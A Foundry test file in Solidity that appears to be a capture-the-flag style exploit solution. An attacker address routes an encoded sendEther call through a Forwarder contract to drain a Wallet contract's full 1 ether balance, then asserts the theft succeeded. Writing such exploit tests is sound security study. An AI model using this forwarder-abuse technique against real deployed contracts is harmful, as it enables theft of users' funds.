// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Forwarder.sol";

contract ForwarderTest is Test {
    Forwarder public forwarderContract;
    Wallet public walletContract;
    address public attackerWallet;

    function setUp() public {
        // Deploy Forwarder contract
        forwarderContract = new Forwarder();

        // Deploy Wallet contract with 1 ether funded and linked to Forwarder
        walletContract = new Wallet{value: 1 ether}(address(forwarderContract));

        // Assign an attacker address
        attackerWallet = makeAddr("attacker");
    }

    function testExploit() public {
        // Record the initial balance of the attacker
        uint256 attackerWalletBalanceBefore = attackerWallet.balance;

        // Conduct the exploit here
        // Example:
        // vm.prank(attackerWallet);
        // walletContract.someVulnerableFunction();
        vm.prank(attackerWallet);
        bytes memory data = abi.encodeWithSignature("sendEther(address,uint256)",
            address(attackerWallet),
            address(walletContract).balance);
        forwarderContract.functionCall(address(walletContract), data);

        // Verify attacker's balance increased
        uint256 attackerWalletBalanceAfter = attackerWallet.balance;
        assertApproxEqRel(
            attackerWalletBalanceAfter - attackerWalletBalanceBefore,
            1 ether,
            0.001e18 // 0.1% tolerance
        );

        // Verify Wallet contract's balance is zero
        assertEq(address(walletContract).balance, 0);
    }
}
